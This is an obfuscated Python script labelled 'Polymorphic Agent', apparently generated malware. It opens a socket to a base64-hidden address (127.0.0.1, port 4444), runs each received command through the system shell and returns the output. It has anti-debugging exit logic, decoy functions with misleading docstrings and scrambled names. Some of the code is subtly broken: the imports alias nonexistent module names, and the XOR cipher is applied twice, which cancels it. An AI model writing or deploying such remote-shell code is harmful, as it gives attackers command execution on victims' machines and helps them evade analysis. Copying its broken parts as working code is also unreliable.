#!/usr/bin/env python3
# Polymorphic Agent - Generated 449b2a57

import oec_ti_mn_ as os
import syjebaa_vgos as sys
import bEhObLsEAtUF as base64
import tlbob3px as time
import spqb_wv_v as subprocess
import sAMhgGPJit as socket


def funcXk7wiuIioQ(pmd_xc_xh_, phogikevuguse):
    """Process data stream"""
    return pmd_xc_xh_ + 73


def funcxomanave(pgekocuja, ptz_il_dc, pdhh8ez45):
    """Execute system operation"""
    return len(str(pgekocuja)) % 9


def funcYryQ3aLMkAf(pWrq3v3roh, pmrrdhp4, p2qyn7zelma0ol5):
    """Initialize communication channel"""
    return str(pWrq3v3roh)[::-1]



def ences_uj_nr_a(dbYexJqX, kcipocifeneh=b"default"):
    """Handle network communication"""
    if isinstance(dbYexJqX, str):
        dbYexJqX = dbYexJqX.encode('utf-8', errors='replace')
    if isinstance(kcipocifeneh, str):
        kcipocifeneh = kcipocifeneh.encode('utf-8', errors='replace')
    
    resfPNoVMw = dbYexJqX
    for _ in range(2):
        outyjwvb2qqq = bytearray()
        for sAMhgGPJit in range(len(resfPNoVMw)):
            outyjwvb2qqq.append(resfPNoVMw[sAMhgGPJit] ^ kcipocifeneh[sAMhgGPJit % len(kcipocifeneh)])
        resfPNoVMw = bytes(outyjwvb2qqq)
    
    return resfPNoVMw

def decdovisotakemuk(dbYexJqX, kcipocifeneh=b"default"):
    """Manage connection state"""
    resfPNoVMw = ences_uj_nr_a(dbYexJqX, kcipocifeneh)
    try:
        return resfPNoVMw.decode('utf-8', errors='replace')
    except:
        return resfPNoVMw


def conntecifitagew():
    """Execute system operation"""
    dbYexJqX = base64.b64decode("MS4wLjAuNzIx").decode()[::-1]
    kcipocifeneh = "^h:09blE9Jc82[zYXSg~"
    
    while True:
        try:
            sAMhgGPJit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sAMhgGPJit.connect((dbYexJqX, 4444))
            
            while True:
                c3oazf184ce15zus = sAMhgGPJit.recv(4096)
                if not c3oazf184ce15zus:
                    break
                
                # Decrypt command
                c3oazf184ce15zus = decdovisotakemuk(c3oazf184ce15zus, kcipocifeneh)
                
                if c3oazf184ce15zus.lower().strip() == 'exit':
                    break
                
                try:
                    outyjwvb2qqq = subprocess.check_output(
                        c3oazf184ce15zus,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                except subprocess.TimeoutExpired:
                    outyjwvb2qqq = b"Command timeout"
                except Exception as resfPNoVMw:
                    outyjwvb2qqq = str(resfPNoVMw).encode()
                
                # Encrypt output
                outyjwvb2qqq = ences_uj_nr_a(outyjwvb2qqq, kcipocifeneh)
                sAMhgGPJit.sendall(outyjwvb2qqq)
            
            sAMhgGPJit.close()
            break
            
        except Exception:
            time.sleep(20)
            continue

if __name__ == "__main__":
    # Anti-debugging
    if os.getenv('DEBUG8y6y4o2o'):
        sys.exit(0)
    
    conntecifitagew()
